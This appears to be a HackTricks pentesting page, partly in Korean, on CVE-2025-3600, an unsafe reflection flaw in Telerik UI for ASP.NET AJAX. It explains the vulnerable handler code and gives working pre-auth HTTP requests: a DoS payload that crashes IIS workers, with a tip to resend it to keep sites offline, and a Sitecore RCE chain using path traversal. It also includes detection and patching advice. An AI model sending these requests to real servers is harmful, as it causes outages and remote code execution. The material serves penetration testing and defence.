# Telerik UI for ASP.NET AJAX – Unsafe Reflection via WebResource.axd (type=iec)

{{#include ../../banners/hacktricks-training.md}}

> Pre‑auth constructor execution in Telerik UI for ASP.NET AJAX Image Editor cache handler enables universal DoS and, in many apps, pre‑auth RCE via target‑specific gadgets (CVE-2025-3600).

## TL;DR

- Affected component/route: Telerik.Web.UI.WebResource.axd with query type=iec (Image Editor cache handler). Exposed pre‑auth in many products.
- Primitive: Attacker controls a type name (prtype). The handler resolves it with Type.GetType() and invokes Activator.CreateInstance() before verifying interface type-safety. Any public parameterless .NET type constructor will run.
- Impact:
  - Universal pre‑auth DoS with a .NET framework gadget (PowerShell WSMan finalizer).
  - Often elevates to pre‑auth RCE in real deployments by abusing app‑specific gadgets, especially insecure AppDomain.AssemblyResolve handlers.
- Fix: Update to Telerik UI for ASP.NET AJAX 2025.1.416+ or remove/lock the handler.

## 영향 받는 버전

- Telerik UI for ASP.NET AJAX 버전 2011.2.712 부터 2025.1.218(포함)까지 취약합니다.
- 2025.1.416(릴리스 2025-04-30)에서 수정되었습니다. 즉시 패치하거나 핸들러를 제거/잠그세요.

## 영향 범위 및 빠른 탐지

- 노출 확인:
  - 핸들러가 연결되어 있으면 GET /Telerik.Web.UI.WebResource.axd 는 404/403 이외의 응답을 반환해야 합니다.
  - web.config에서 Telerik.Web.UI.WebResource.axd로 매핑된 핸들러를 확인하세요.
  - 취약한 코드 경로를 트리거하려면: type=iec, dkey=1, prtype=<AssemblyQualifiedType> 가 필요합니다.

Example probe and generic trigger:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly
```
참고
- 일부 PoCs는 dtype을 사용합니다; 구현은 다운로드 흐름에서 dkey=="1"을 확인합니다.
- prtype는 assembly-qualified이거나 현재 AppDomain에서 해결 가능해야 합니다.

## 근본 원인 – ImageEditorCacheHandler에서의 unsafe reflection

Image Editor의 캐시 다운로드 흐름은 prtype에 제공된 타입의 인스턴스를 생성하고, 나중에 그것을 ICacheImageProvider로 캐스트한 다음 다운로드 키를 검증합니다. 검증이 실패할 때에는 이미 생성자의 실행이 완료된 상태입니다.

<details>
<summary>관련 디컴파일된 흐름</summary>
```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
string text = context.Request["dkey"];           // dkey
string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
...
if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
{
ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
string key = context.Request["key"];
if (text == "1" && !this.IsValidDownloadKey(text2))
{
this.CompleteAsBadRequest(context.ApplicationInstance);
return; // cast/check happens after ctor has already run
}
using (EditableImage editableImage = imageProvider.Retrieve(key))
{
this.SendImage(editableImage, context, text, fileName);
}
}
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
if (!string.IsNullOrEmpty(context.Request["prtype"]))
{
return RadImageEditor.InitCacheImageProvider(
RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
);
}
...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
// unsafe: construct before enforcing interface type-safety
return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```
</details>

익스플로잇 기본 원리: 제어된 타입 문자열 → Type.GetType가 이를 해석 → Activator.CreateInstance가 공개 매개변수 없는 생성자를 실행한다. 요청이 이후에 거부되더라도 gadget의 부작용은 이미 발생한다.

## Universal DoS gadget (앱-특정 gadget 불필요)

클래스: System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper in System.Management.Automation (PowerShell)는 finalizer가 초기화되지 않은 핸들을 Dispose하여, GC가 이를 finalizer에서 처리할 때 처리되지 않은 예외를 발생시킨다. 이로 인해 인스턴스화 직후 IIS 워커 프로세스가 신뢰성 있게 충돌한다.

원샷 DoS 요청:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
Notes
- 사이트를 오프라인 상태로 유지하려면 주기적으로 계속 전송하세요. 디버거에서 constructor가 호출되는 것을 관찰할 수 있으며; finalization 시 크래시가 발생합니다.

## From DoS to RCE – escalation patterns

Unsafe constructor execution unlocks many target‑specific gadgets and chains. Hunt for:

1) Parameterless constructors that process attacker input
- Some ctors (or static initializers) immediately read Request query/body/cookies/headers and (de)serialize them.
- Example (Sitecore): a ctor chain reaches GetLayoutDefinition() which reads HTTP body "layout" and deserializes JSON via JSON.NET.

2) Constructors that touch files
- Ctros that load or deserialize config/blobs from disk can be coerced if you can write to those paths (uploads/temp/data folders).

3) Constructors performing app-specific ops
- Resetting state, toggling modules, or terminating processes.

4) Constructors/static ctors that register AppDomain event handlers
- Many apps add AppDomain.CurrentDomain.AssemblyResolve handlers that build DLL paths from args.Name without sanitization. If you can influence type resolution you can coerce arbitrary DLL loads from attacker‑controlled paths.

5) Forcing AssemblyResolve via Type.GetType
- Request a non-existent type to force CLR resolution and invoke registered (possibly insecure) resolvers. Example assembly-qualified name:
```
This.Class.Does.Not.Exist, watchTowr
```
6) 파이널라이저(finalizer)의 파괴적 부작용
- 일부 타입은 파이널라이저에서 고정 경로의 파일을 삭제합니다. link-following 또는 예측 가능한 경로와 결합되면 특정 환경에서 local privilege escalation을 초래할 수 있습니다.

## Example pre‑auth RCE chain (Sitecore XP)

- Step 1 – Pre‑auth: static/instance ctor가 취약한 AssemblyResolve handler를 등록하는 타입을 트리거합니다 (e.g., Sitecore’s FolderControlSource in ControlFactory).
- Step 2 – Post‑auth: resolver-probed 디렉터리에 쓰기 권한을 얻어 악성 DLL을 심습니다 (e.g., via an auth bypass or weak upload).
- Step 3 – Pre‑auth: 존재하지 않는 타입과 traversal‑laden assembly name을 사용해 CVE‑2025‑3600을 악용하여 리졸버가 심어둔 DLL을 로드하도록 강제 → code execution as the IIS worker.

트리거 예시
```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```
## 검증, hunting 및 DFIR 노트

- 안전한 실험실 검증: DoS 페이로드를 발사하고 WSMan finalizer와 연관된 앱 풀 재시작/처리되지 않은 예외를 관찰합니다.
- 텔레메트리에서 수색:
- Requests to /Telerik.Web.UI.WebResource.axd with type=iec and odd prtype values.
- 타입 로드 실패 및 AppDomain.AssemblyResolve 이벤트.
- 이러한 요청 이후의 갑작스러운 w3wp.exe 충돌/재시작.

## 완화 조치

- Telerik UI for ASP.NET AJAX 2025.1.416 이상으로 패치.
- 가능한 경우 Telerik.Web.UI.WebResource.axd의 노출을 제거하거나 제한 (WAF/rewrites).
- 서버 측의 prtype 처리를 무시하거나 강화(업그레이드는 인스턴스화 전에 적절한 검사 적용).
- 커스텀 AppDomain.AssemblyResolve 핸들러를 감사하고 강화. args.Name에서 경로를 무검증으로 생성하지 마십시오; strong-named loads 또는 화이트리스트를 선호합니다.
- 업로드/쓰기 위치를 제한하고 probed 디렉토리에 DLL이 떨어지는 것을 방지.
- resolver 악용을 포착하기 위해 존재하지 않는 타입 로드 시도를 모니터링.

## 치트시트

- Presence check:
- GET /Telerik.Web.UI.WebResource.axd
- web.config에서 handler 매핑 확인
- Exploit skeleton:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=<TypeName,+Assembly,+Version=..., +PublicKeyToken=...>
```
- Universal DoS:
```http
...&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
- 트리거 리졸버:
```
This.Class.Does.Not.Exist, watchTowr
```
## 관련 기술

- IIS post-exploitation, .NET key extraction, and in‑memory loaders:

{{#ref}}
iis-internet-information-services.md
{{#endref}}

- ASP.NET ViewState deserialization and machineKey abuses:

{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

## 참고자료

- [watchTowr labs – More than DoS: Progress Telerik UI for ASP.NET AJAX Unsafe Reflection (CVE-2025-3600)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace (Mirosh & Muñoz) – DoS gadget background](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes to escalate privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Is “B” for Backdoor? (Sitecore chain CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

{{#include ../../banners/hacktricks-training.md}}
